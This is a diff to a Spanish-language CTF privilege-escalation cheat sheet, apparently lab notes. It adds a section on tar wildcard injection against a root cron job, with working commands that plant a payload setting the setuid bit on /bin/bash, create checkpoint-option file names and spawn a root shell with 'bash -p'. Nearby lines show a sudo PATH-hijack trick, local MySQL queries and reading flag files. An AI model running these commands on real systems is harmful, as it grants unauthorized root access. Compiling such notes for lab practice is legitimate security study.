@@ -114,7 +114,31 @@ Y ejecutamos el script forzando el PATH:
 sudo PATH=/ruta/controlada:$PATH /ruta/controlada/script.sh
 ```
 
-## 7. Bases de datos locales
+## 7. Wildcard injection en `tar` (cron como root)
+
+Cuando un cron de root ejecuta `tar czf ... *` en un directorio escribible, los nombres de fichero se convierten en argumentos de `tar` (patrón de **Operation Coldstart**):
+
+```
+cd /DIRECTORIO_DEL_CRON
+echo 'chmod +s /bin/bash' > payload.sh
+chmod +x payload.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh payload.sh'
+```
+
+Esperar a que el cron corra (~1 minuto) y comprobar:
+
+```
+/bin/bash -p
+id          # uid=webdev ... euid=0(root)
+```
+
+- `--checkpoint=1` + `--checkpoint-action=exec=sh ...` → `tar` ejecuta el script **como root** al expandir el comodín `*`.
+- `touch --` con el `--` **separado** del nombre: si no, se fusionan y sale `touch: unrecognized option '---checkpoint=1'`.
+- Rutas **absolutas** en el payload: el cron hace `cd` al directorio antes de lanzar `tar`.
+- El usuario real sigue siendo el nuestro, pero el **euid es 0**; por eso se lanza `bash -p` (preserva el privilegio).
+
+## 8. Bases de datos locales
 
 ```
 mysql -u <usuario> -p -h localhost <basededatos>
@@ -130,7 +154,7 @@ show tables;
 select * from <tabla>;
 ```
 
-## 8. Recoger las banderas
+## 9. Recoger las banderas
 
 ```
 cat user.txt
